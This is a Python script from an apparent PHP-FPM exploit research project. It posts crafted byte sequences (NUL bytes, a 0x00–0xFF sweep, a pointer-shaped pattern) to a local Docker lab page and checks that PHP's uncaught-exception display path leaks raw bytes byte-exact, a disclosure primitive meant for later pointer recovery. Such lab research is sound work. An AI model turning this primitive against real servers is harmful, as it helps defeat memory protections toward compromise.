#!/usr/bin/env python3
"""Verify: the uncaught-exception (%S) display path carries RAW bytes -- NUL and
high bytes -- into the fpm HTTP response body, byte-exact. This is the NUL-safe
property that distinguishes this channel from the ps_files `%s` warning (whose
window ends at the first zero byte). Confirms the DISCLOSURE CHANNEL only -- not a
recovered pointer/K (that needs a corruptible-arg seat; see the module docstring).

Lab: profile fpmfire (needs display_errors=on + html_errors=off -- lab/fpmfire/pool.conf;
fixture lab/fpmfire/html/throwparam.php):
    docker compose -f docker-compose.fpm-avenues.yml --profile fpmfire up -d --build
    # nginx 127.0.0.1:18085
Run:
    python3 -I poc/primitives/read_leak/verify_uncaught_exception_overread_leak.py

PASS iff every crafted byte sequence (NUL, 0x00..0xFF sweep, page-aligned-pointer
shape 0x00????????????) round-trips byte-exact out of the parser.
"""
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)

from primitives.read_leak.uncaught_exception_overread_leak import (  # noqa: E402
    parse_overread, tail_after, detect)

URL = "http://127.0.0.1:18085/throwparam.php"
THROW_FILE = b"/var/www/html/throwparam.php"


def _post(m: bytes) -> bytes | None:
    body = b"m=" + urllib.parse.quote_from_bytes(m).encode()
    req = urllib.request.Request(URL, data=body, method="POST",
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        return urllib.request.urlopen(req, timeout=10).read()
    except urllib.error.HTTPError as e:
        return e.read()
    except Exception:
        return None


def main() -> int:
    sentinel = b"SENT|"
    cases = {
        "embedded-NUL": sentinel + b"A\x00B\x00C",
        "full-byte-sweep": sentinel + bytes(range(256)),
        "page-aligned-ptr": sentinel + b"\x00\x60\x00\x00\x00\x00\x00\x00" + b"TAIL",
        "high-bytes": sentinel + b"\xff\xfe\xfd\x80\x81",
    }
    # Reachability check first.
    probe = _post(sentinel + b"PROBE")
    if probe is None:
        print("SKIP: lab unreachable (bring up profile fpmfire; see docstring)")
        return 0
    if not detect(probe):
        print("FAIL: no uncaught-exception line in body -- display_errors/html_errors?")
        print(repr(probe[:200]))
        return 1

    ok = 0
    for name, payload in cases.items():
        body = _post(payload)
        leak = parse_overread(body, throw_file=THROW_FILE)
        got = tail_after(leak, sentinel)
        want = payload[len(sentinel):]
        if got == want:
            print(f"PASS {name}: {len(want)} bytes byte-exact")
            ok += 1
        else:
            print(f"FAIL {name}: want {want!r}\n got  {got!r}")
    print(f"{ok}/{len(cases)}")
    return 0 if ok == len(cases) else 1


if __name__ == "__main__":
    raise SystemExit(main())
